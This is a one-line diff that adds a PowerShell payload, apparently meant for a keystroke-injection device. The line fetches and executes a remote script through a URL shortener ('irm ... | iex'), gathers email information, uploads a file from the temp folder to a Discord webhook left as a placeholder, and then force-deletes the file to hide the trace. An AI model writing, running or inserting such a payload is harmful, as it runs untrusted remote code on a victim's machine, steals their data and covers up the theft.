@@ -1,0 +1,1 @@
+irm "t.ly/U5Zs9"|iex;$filePath = Get-EmailInfo;Upload-Discord -webhookUrl 'YOUR WEBHOOK HERE' -file "$env:TEMP\CaliShot.png";Remove-Item -Path $filePath -Force | Out-Null
